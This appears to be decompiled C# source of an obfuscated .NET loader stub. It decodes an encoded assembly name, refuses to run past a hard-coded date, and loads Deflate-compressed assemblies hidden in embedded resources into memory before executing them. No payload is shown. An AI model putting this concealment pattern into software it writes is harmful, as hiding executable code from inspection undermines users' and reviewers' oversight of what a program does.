using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Policy;
using System.Text;
using ns0;

namespace ns1;

internal static class Class1
{
	[STAThread]
	public static int Main(string[] args)
	{
		Attribute0.Class0.smethod_1();
		if (DateTime.Now > new DateTime(635087019466289531L))
		{
			throw new Exception();
		}
		AppDomain currentDomain = AppDomain.CurrentDomain;
		currentDomain.AssemblyResolve += smethod_0;
		return currentDomain.ExecuteAssemblyByName(new AssemblyName(Class2.smethod_0("\ue3c8\ue393\ue39f\ue3c9\ue3da\ue3cd\ue3cc\ue3d6\ue3d0\ue3d1\ue382\ue38f\ue391\ue38f\ue391\ue38f\ue391\ue38f\ue393\ue39f\ue3dc\ue3ca\ue3d3\ue3cb\ue3ca\ue3cd\ue3da\ue382\ue3d1\ue3da\ue3ca\ue3cb\ue3cd\ue3de\ue3d3\ue393\ue39f\ue3cf\ue3ca\ue3dd\ue3d3\ue3d6\ue3dc\ue3d4\ue3da\ue3c6\ue3cb\ue3d0\ue3d4\ue3da\ue3d1\ue382\ue3d1\ue3ca\ue3d3\ue3d3", 58303)), (Evidence)null, args);
	}

	public static Assembly smethod_0(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		return smethod_1(Convert.ToBase64String(Encoding.Default.GetBytes(resolveEventArgs_0.Name.ToLowerInvariant())));
	}

	public static Assembly smethod_1(string string_0)
	{
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(string_0);
		if (stream != null)
		{
			int count = new BinaryReader(stream).ReadInt32();
			using DeflateStream input = new DeflateStream(stream, CompressionMode.Decompress);
			return Assembly.Load(new BinaryReader(input).ReadBytes(count));
		}
		return null;
	}

	static Class1()
	{
		Attribute0.Class0.smethod_1();
	}
}
